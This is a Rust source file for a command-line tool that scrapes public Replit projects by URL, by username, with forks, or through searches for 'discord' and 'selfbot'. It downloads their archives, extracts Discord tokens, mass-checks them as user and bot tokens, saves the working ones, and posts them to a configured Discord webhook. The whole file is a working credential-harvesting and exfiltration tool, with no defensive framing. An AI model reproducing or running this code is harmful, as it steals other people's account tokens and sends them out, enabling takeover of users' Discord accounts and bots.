use discord_api::{Discord, Webhook};
use repl_api::{ReplAPI, ReplGlobal, fetch_zip};
use ascii::{cli, options, clear, input};
use util::{search_extract, write_file, fetch_lines};
use tokio::main;
use serde::Deserialize;
use serde_json::from_str;
use std::fs;
use reqwest::Client;



#[derive(Debug, Deserialize)]
struct Config {
    webhook: Option<String>
}


#[main()]
async fn main() {
    if cfg!(target_os = "windows") {
        std::process::Command::new("cmd").arg("/C").arg("color");
    }
    loop {
        clear();
        cli();
        options();
        let option = input("Please enter an option", None);
        let option = option.trim().parse::<u32>();

        match option {
            Ok(option) => {
            match option {
                1 => {
                    let url = input("Please enter a URL to scrape", Some("Example URL: /@someone/repo"));


                    let max = input("Please enter the maximum you want to scrape", None);
                    let max = max.trim().parse::<u32>().unwrap();

                    scrape_url(url.trim(), max).await;
                },
                2 => check_tokens().await,

                3 => {

                    let max = input("Please enter the maximum you want to scrape", None);
                    let max = max.trim().parse::<u32>().unwrap();
                    auto_scrape(max).await
                },
                4 => {
                    let username = input("Please enter a username to scrape", Some("Example Username: YourMom"));
                    let forks_option = input("Would you like to scrape the forks?", None);
                    if forks_option.to_lowercase() == "y" {
                        let max = input("Please enter the maximum you want to scrape", None);
                        user_scrape_with_fork(username, Some(max.parse::<u32>().unwrap())).await;
                    } else {
                        user_scrape(username).await;
                    }

                },
                _ => continue
            }
            },
            Err(_) => continue
        }
    }

}

async fn user_scrape(username: String) {
    let repl = ReplAPI {};
    let mut unchecked_tokens = vec![];
    let mut count = 0;
    let zips = repl.fetch_zips_user(&username).await;
    for zip in zips {
        count += 1;
        let mut token = search_extract(zip, count).await;
        unchecked_tokens.append(&mut token);
    }
    for token in unchecked_tokens.clone() {
        write_file("false_tokens.txt", &format!("{token}\n")).await;
    }
    let disc = Discord::new(unchecked_tokens.clone());
    let valid_users = disc.mass_check_user().await;
    println!("\x1b[0;34m
╔════════════════════════╬
║ Valid User Tokens: {}
║ Total invalid: {}
╚════════════════════════╬
    \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
    write_file("valid.txt", "User Tokens:\n\n").await;
    for token in valid_users.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send(&username, "User", valid_users).await;
        }
    }
    let valid_bots = disc.mass_check_bot().await;
    println!("\x1b[0;34m
╔════════════════════════╬
║ Valid Bot Tokens: {}
║ Total invalid: {}
╚════════════════════════╬
    \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());

    write_file("valid.txt", "Bot Tokens:\n\n").await;
    for token in valid_bots.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send(&username, "Bot", valid_bots).await;
        }
    }
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
}

async fn user_scrape_with_fork(username: String, max: Option<u32>) {
    let repl = ReplAPI{};
    if let Some(max) = max {
        let mut unchecked_tokens = vec![];
        let mut count = 0;
        let zips = repl.fetch_zips_with_forks_user(&username, max).await;
        for zip in zips {
            count += 1;
            let mut token = search_extract(zip, count).await;
            unchecked_tokens.append(&mut token);
        }
        for token in unchecked_tokens.clone() {
            write_file("false_tokens.txt", &format!("{token}\n")).await;
        }
        let disc = Discord::new(unchecked_tokens.clone());
        let valid_users = disc.mass_check_user().await;
    println!("\x1b[0;34m
╔════════════════════════╬
║ Valid User Tokens: {}
║ Total invalid: {}
╚════════════════════════╬
    \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
    write_file("valid.txt", "User Tokens:\n\n").await;
    for token in valid_users.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send(&username, "User", valid_users).await;
        }
    }
    let valid_bots = disc.mass_check_bot().await;
    println!("\x1b[0;34m
╔════════════════════════╬
║ Valid Bot Tokens: {}
║ Total invalid: {}
╚════════════════════════╬
    \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());

    write_file("valid.txt", "Bot Tokens:\n\n").await;
    for token in valid_bots.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send(&username, "Bot", valid_bots).await;
        }
    }
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
    } else {
        let mut unchecked_tokens = vec![];
        let mut count = 0;
        let zips = repl.fetch_zips_user(&username).await;
        for zip in zips {
            count += 1;
            let mut token = search_extract(zip, count).await;
            unchecked_tokens.append(&mut token);
        }
        for token in unchecked_tokens.clone() {
            write_file("false_tokens.txt", &format!("{token}\n")).await;
        }
        let disc = Discord::new(unchecked_tokens.clone());
        let valid_users = disc.mass_check_user().await;
    println!("\x1b[0;34m
╔════════════════════════╬
║ Valid User Tokens: {}
║ Total invalid: {}
╚════════════════════════╬
    \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
    write_file("valid.txt", "User Tokens:\n\n").await;
    for token in valid_users.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send(&username, "User", valid_users).await;
        }
    }
    let valid_bots = disc.mass_check_bot().await;
    println!("\x1b[0;34m
╔════════════════════════╬
║ Valid Bot Tokens: {}
║ Total invalid: {}
╚════════════════════════╬
    \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());

    write_file("valid.txt", "Bot Tokens:\n\n").await;
    for token in valid_bots.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send(&username, "Bot", valid_bots).await;
        }
    }
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
    }

}


async fn auto_scrape(max: u32) {
    let repl = ReplGlobal{};
    let mut gathered = tokio::join!(repl.fech_urls("discord", max), repl.fech_urls("selfbot", max), repl.fech_urls("discord bot", max));
    let repl = ReplAPI{};
    let mut urls = vec![];

    urls.append(&mut gathered.0);
    urls.append(&mut gathered.1);
    urls.append(&mut gathered.2);
    let urls = repl.fetch_urls_global(urls).await;



    let client = Client::new();
    let mut count = 0;

    for url in urls {
        count += 1;
        let mut unchecked_tokens = vec![];
        if let Some(zip) = fetch_zip(client.clone(), url.clone(), count).await {
            let mut token = search_extract(zip, count).await;
            unchecked_tokens.append(&mut token);
        }
        let disc = Discord::new(unchecked_tokens.clone());
        let valid_users = disc.mass_check_user().await;
    println!("\x1b[0;34m
╔════════════════════════╬
║ Valid User Tokens: {}
║ Total invalid: {}
╚════════════════════════╬
    \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
    write_file("valid.txt", "User Tokens:\n\n").await;
    for token in valid_users.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send(&url, "User", valid_users).await;
        }
    }
    let valid_bots = disc.mass_check_bot().await;
    println!("\x1b[0;34m
╔════════════════════════╬
║ Valid Bot Tokens: {}
║ Total invalid: {}
╚════════════════════════╬
    \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());

    write_file("valid.txt", "Bot Tokens:\n\n").await;
    for token in valid_bots.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send(&url, "Bot", valid_bots).await;
        }
    }
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await

    }
}

async fn check_tokens() {
    let unchecked_tokens = fetch_lines("./false_tokens.txt");
    let disc = Discord::new(unchecked_tokens.clone());
    let valid_users = disc.mass_check_user().await;
    println!("\x1b[0;34m
╔════════════════════════╬
║ Valid User Tokens: {}
║ Total invalid: {}
╚════════════════════════╬
    \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
    write_file("valid.txt", "User Tokens:\n\n").await;
    for token in valid_users.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send("None", "User", valid_users).await;
        }
    }
    let valid_bots = disc.mass_check_bot().await;
    println!("\x1b[0;34m
╔════════════════════════╬
║ Valid Bot Tokens: {}
║ Total invalid: {}
╚════════════════════════╬
    \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());

    write_file("valid.txt", "Bot Tokens:\n\n").await;
    for token in valid_bots.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send("None", "Bot", valid_bots).await;
        }
    }
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
}

async fn scrape_url(url: &str, count: u32) {
    let repl = ReplAPI{};
    let data = repl.fetch_zips_url(url, count).await;
    let mut unchecked_tokens = vec![];
    let mut count = 0;
    for zip in data {
        count += 1;
        let mut token = search_extract(zip, count).await;
        unchecked_tokens.append(&mut token);
    }
    for token in unchecked_tokens.clone() {
        write_file("false_tokens.txt", &format!("{token}\n")).await;
    }
    let disc = Discord::new(unchecked_tokens.clone());
    let valid_users = disc.mass_check_user().await;
    println!("\x1b[0;34m
╔════════════════════════╬
║ Valid User Tokens: {}
║ Total invalid: {}
╚════════════════════════╬
    \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
    write_file("valid.txt", "User Tokens:\n\n").await;
    for token in valid_users.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send(url, "User", valid_users).await;
        }
    }
    let valid_bots = disc.mass_check_bot().await;
    println!("\x1b[0;34m
╔════════════════════════╬
║ Valid Bot Tokens: {}
║ Total invalid: {}
╚════════════════════════╬
    \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());

    write_file("valid.txt", "Bot Tokens:\n\n").await;
    for token in valid_bots.clone() {
        write_file("valid.txt", &format!("{token}\n")).await;
    }
    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
    if let Ok(config) = config {
        if let Some(webhook) = config.webhook {
            let web = Webhook::new(&webhook);
            web.send(url, "Bot", valid_bots).await;
        }
    }
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
}